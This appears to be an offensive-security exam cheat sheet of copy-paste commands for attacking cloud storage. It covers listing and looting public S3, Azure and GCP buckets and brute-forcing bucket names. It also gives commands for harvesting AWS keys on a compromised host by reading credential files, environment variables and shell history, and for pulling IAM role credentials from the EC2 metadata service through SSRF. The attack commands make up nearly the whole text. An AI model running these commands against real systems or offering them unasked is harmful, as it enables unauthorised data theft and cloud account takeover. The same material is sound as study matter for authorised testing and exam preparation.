# 17 Cloud — copy-paste commands

> Replace `<BUCKET>`, `<KEYWORD>`, `<FILE>` with your values.

## AWS S3 — anonymous (most exam questions)

```bash
# List root of a public bucket
aws s3 ls s3://<BUCKET> --no-sign-request

# Recursive listing
aws s3 ls s3://<BUCKET> --recursive --no-sign-request

# Download a single file
aws s3 cp s3://<BUCKET>/<FILE> . --no-sign-request

# Download the whole bucket
aws s3 cp s3://<BUCKET> ./loot --recursive --no-sign-request

# Sync (faster for lots of files)
aws s3 sync s3://<BUCKET> ./loot --no-sign-request
```

## S3 via HTTP (browser-friendly)

```bash
# Bucket listing XML
curl "http://<BUCKET>.s3.amazonaws.com/"

# Alternative URL forms
curl "https://s3.amazonaws.com/<BUCKET>/"
curl "https://<BUCKET>.s3.<REGION>.amazonaws.com/"

# Single object
curl "http://<BUCKET>.s3.amazonaws.com/<FILE>" -o <FILE>
```

## S3 enum — find buckets by name

```bash
# cloud_enum — AWS + Azure + GCP
cloud_enum -k <KEYWORD>
cloud_enum -k acme -k acme-corp -k acmeinc

# s3scanner
s3scanner scan --bucket <BUCKET>
s3scanner scan --bucket-file buckets.txt

# Common name patterns to always try
for w in backup backups dev prod stage staging logs data assets static media private; do
  aws s3 ls s3://<COMPANY>-$w --no-sign-request 2>/dev/null && echo "HIT: <COMPANY>-$w"
done
```

## Authenticated AWS (creds recovered)

```bash
aws configure                       # paste AK / SK / region
aws sts get-caller-identity         # who am I
aws s3 ls                           # buckets I can see
aws ec2 describe-instances --region us-east-1
aws iam list-users
aws iam list-access-keys --user-name <USER>
```

## Azure Blob Storage

```bash
# List a public container via REST
curl "https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>/?restype=container&comp=list"

# With az cli
az storage blob list --account-name <ACCOUNT> --container-name <CONTAINER> --auth-mode login
```

## GCP Storage

```bash
# List
gsutil ls gs://<BUCKET>/
gsutil ls -r gs://<BUCKET>/

# Download
gsutil cp gs://<BUCKET>/<FILE> .

# HTTP (anonymous)
curl "https://storage.googleapis.com/<BUCKET>/"
```

## Finding leaked creds on a compromised host

```bash
cat ~/.aws/credentials
cat ~/.aws/config
env | grep -i aws
grep -r 'AKIA' /home 2>/dev/null
grep -r 'aws_secret' /var/www 2>/dev/null
cat ~/.bash_history | grep -i aws
```

## IAM metadata (from an EC2 / SSRF)

```bash
# IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
